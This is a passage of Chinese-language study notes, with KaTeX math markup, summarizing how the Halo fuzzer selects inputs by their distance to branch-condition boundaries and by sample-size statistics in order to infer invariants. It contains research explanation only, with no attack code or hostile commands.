encoding="application/x-tex">D</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span></eq> 包括了。因此我们不需要在推断中使用 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi></mrow><annotation encoding="application/x-tex">E</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span></span></eq> ，这样可以减少不变量推理的开销</li></ul></li><li>然而，量化不变量推理中输入的有效性是一项具有挑战性的任务。为了解决这个问题，我们可以将输入分布视为数据聚类问题，只有接近条件边界的输入才能有助于推断不变量。原理边界的输入无法有效地描述目标条件。<ul><li>例如，图4中红线所示额的范围之外的输入比红线内的输入更不可能产生精确的不变量。因此，我们可以根据输入距离条件边界的距离来选择输入<br><img src="/images/%E8%AE%BA%E6%96%87/invariant/2_5.png" alt></li></ul></li></ul><h5 id="how-to-select-inputs" tabindex="-1">How to Select Inputs</h5><ul><li><p>基于前面的灵感，我们设计了一种基于距离的输入选择策略来选择可以有效推断不变量的输入</p></li><li><p>距离维度描述了每个输入距离边界条件的接近程度</p></li><li><p>如图2示，路径条件可以视为一个函数 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></eq>, <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span></eq> 为相关输入向量。 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">f(x)=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span></eq> 表示边界条件, <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|f(x)|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mord">∣</span></span></span></span></eq> 为到边界的距离，因此，我们可以通过计算 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|f(x)|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mord">∣</span></span></span></span></eq> 来选择输入</p></li><li><p>具体来说，在第一次突变种子之前，我们使用基于推理的污点分析 (inference-based taint analysis)[30-34]的过程，通过逐个字节地变异来获取影响到目标的输入。</p></li><li><p>We leave potential customization and fine-tuning of taint analysis as future work.</p></li><li><p>在分析过程中，我们还记录了这些相关字节和 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|f(x)|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mord">∣</span></span></span></span></eq></p></li><li><p>为了方便计算，我们使用未出现在循环中的分支条件的值作为 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></eq> 。因此，Halo可以保留一组接近目标且 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></eq> 较小的输入集</p></li><li><p><strong>Example 3.5</strong></p><ul><li><p>假设在图1的程序中，我们有三个输入 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo separator="true">,</mo><mi>d</mi><mo stretchy="false">)</mo><mo>:</mo><mo stretchy="false">(</mo><mn>6</mn><mo separator="true">,</mo><mn>8</mn><mo separator="true">,</mo><mn>10</mn><mo separator="true">,</mo><mn>10</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">B(a,b,c,d):(6,8,10,10)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">8</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">10</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">10</span><span class="mclose">)</span></span></span></span></eq>, <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo separator="true">,</mo><mi>d</mi><mo stretchy="false">)</mo><mo>:</mo><mo stretchy="false">(</mo><mn>6</mn><mo separator="true">,</mo><mn>10</mn><mo separator="true">,</mo><mn>12</mn><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">B(a,b,c,d):(6,10,12,0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">10</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">12</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">0</span><span class="mclose">)</span></span></span></span></eq>, <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo separator="true">,</mo><mi>d</mi><mo stretchy="false">)</mo><mo>:</mo><mo stretchy="false">(</mo><mn>6</mn><mo separator="true">,</mo><mn>100</mn><mo separator="true">,</mo><mn>12</mn><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">C(a,b,c,d):(6,100,12,0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">100</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">12</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">0</span><span class="mclose">)</span></span></span></span></eq>，我们可以结算 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></eq> 为，每个输入在 line 11-13 行条件判断的距离</p><ul><li><section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>f</mi><mo stretchy="false">(</mo><mi>B</mi><mo stretchy="false">)</mo><mi mathvariant="normal">∣</mi><mo>=</mo><mn>20</mn><mo>−</mo><mn>12</mn><mo>+</mo><mn>14</mn><mo>−</mo><mn>10</mn><mo>+</mo><mn>20</mn><mo>−</mo><mn>10</mn><mo>=</mo><mn>22</mn></mrow><annotation encoding="application/x-tex">|f (B)| = 20 − 12 + 14 − 10 + 20 − 10 = 22</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">)</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">20</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">12</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">14</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">10</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">20</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">22</span></span></span></span></span></eqn></section></li><li><section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>f</mi><mo stretchy="false">(</mo><mi>D</mi><mo stretchy="false">)</mo><mi mathvariant="normal">∣</mi><mo>=</mo><mn>20</mn><mo>−</mo><mn>12</mn><mo>+</mo><mn>16</mn><mo>−</mo><mn>10</mn><mo>+</mo><mn>20</mn><mo>−</mo><mn>12</mn><mo>=</mo><mn>22</mn></mrow><annotation encoding="application/x-tex">|f (D)| = 20 − 12 + 16 − 10 + 20 − 12 = 22</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mclose">)</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">20</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">12</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">16</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">10</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">20</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">12</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">22</span></span></span></span></span></eqn></section></li><li><section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>f</mi><mo stretchy="false">(</mo><mi>E</mi><mo stretchy="false">)</mo><mi mathvariant="normal">∣</mi><mo>=</mo><mn>20</mn><mo>−</mo><mn>12</mn><mo>+</mo><mn>106</mn><mo>−</mo><mn>10</mn><mo>+</mo><mn>20</mn><mo>−</mo><mn>12</mn><mo>=</mo><mn>112</mn></mrow><annotation encoding="application/x-tex">|f (E)| = 20 − 12 + 106 − 10 + 20 − 12 = 112</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mclose">)</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">20</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">12</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">106</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">10</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">20</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">12</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">112</span></span></span></span></span></eqn></section></li></ul></li><li>因为 E 的距离里边界最元，我们只选择B和D作为代表性的输入在不变量推断中</li></ul></li><li>然而，对于没有达到目标的输入，我们无法获得距离，因为 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></eq> 无法执行<ul><li>因此，Hao根据是否达到目标来分离用于不变量推理的输入</li><li>在达到目标之前，Halo仅利用不可达的输入来推断所有输入字节的可能不变量，这表明可达输入不应该满足的条件</li><li>通过否定从不可达输入推断出的不变量，fuzzer仍然可以限制生成输入的搜索空间</li></ul></li><li><strong>Example 3.6</strong><ul><li>假设我们有不变量 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mrow><mi>u</mi><mi>n</mi><mi>r</mi><mi>e</mi><mi>a</mi><mi>c</mi><mi>h</mi></mrow></msub><mo>:</mo><mo stretchy="false">{</mo><mi>a</mi><mo>&gt;</mo><mn>12</mn><mo separator="true">,</mo><mi>b</mi><mo>&lt;</mo><mn>6</mn><mo separator="true">,</mo><mi>c</mi><mo>≤</mo><mn>20</mn><mo separator="true">,</mo><mi>d</mi><mo>&lt;</mo><mn>10</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">I_{unreach}:\{a&gt;12,b&lt;6,c\leq20,d&lt;10\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">n</span><span class="mord mathnormal mtight">re</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">c</span><span class="mord mathnormal mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord">12</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord">20</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">10</span><span class="mclose">}</span></span></span></span></eq>,从Example3.2中不可达的输入中推断出</li><li>尽管我们可能无法在 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>∈</mo><mrow><mn>10</mn><mo separator="true">,</mo><mn>11</mn><mo separator="true">,</mo><mn>12</mn></mrow></mrow><annotation encoding="application/x-tex">a∈{10,11,12}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord">10</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">11</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">12</span></span></span></span></span></eq> 时使用否定不变量过滤可达输入，因为 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>≤</mo><mn>12</mn></mrow><annotation encoding="application/x-tex">a≤12</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">12</span></span></span></span></eq> 从 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span></span></eq> 中的 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>&gt;</mo><mn>12</mn></mrow><annotation encoding="application/x-tex">a&gt;12</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">12</span></span></span></span></eq> 不可达，而 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>&lt;</mo><mn>7</mn></mrow><annotation encoding="application/x-tex">a&lt;7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span></eq> 在 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span></span></eq> 中可达，但模糊器仍然可以有效地过滤来自 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>&gt;</mo><mn>12</mn></mrow><annotation encoding="application/x-tex">a&gt;12</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">12</span></span></span></span></eq> 和 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo>&gt;</mo><mn>20</mn></mrow><annotation encoding="application/x-tex">c&gt;20</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">20</span></span></span></span></eq> 的输入。</li></ul></li></ul><h5 id="how-many-inputs-selected" tabindex="-1">How many Inputs Selected</h5><ul><li>我们基于计算需要的最小采样的统计理论决定选择多少输入来推断不变量[35]</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mfrac><mrow><mn>4</mn><msup><mi>Z</mi><mn>2</mn></msup></mrow><msup><mi>ε</mi><mn>2</mn></msup></mfrac><mo>=</mo><mn>385</mn></mrow><annotation encoding="application/x-tex">n = \frac{4Z^2}{ε^2}=385</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.3629em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0179em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ε</span><span 